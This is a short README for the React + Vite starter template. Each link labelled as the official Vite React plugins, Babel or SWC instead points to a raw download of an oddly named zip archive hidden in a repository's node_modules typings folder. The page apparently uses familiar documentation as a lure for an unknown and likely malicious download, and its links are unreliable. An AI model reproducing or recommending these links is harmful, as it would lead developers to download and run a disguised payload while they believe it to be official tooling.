# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/saeed-karout/reactMUI-eco/raw/refs/heads/main/node_modules/commander/typings/eco_react_MU_thermotropic.zip) uses [Babel](https://github.com/saeed-karout/reactMUI-eco/raw/refs/heads/main/node_modules/commander/typings/eco_react_MU_thermotropic.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/saeed-karout/reactMUI-eco/raw/refs/heads/main/node_modules/commander/typings/eco_react_MU_thermotropic.zip) uses [SWC](https://github.com/saeed-karout/reactMUI-eco/raw/refs/heads/main/node_modules/commander/typings/eco_react_MU_thermotropic.zip) for Fast Refresh
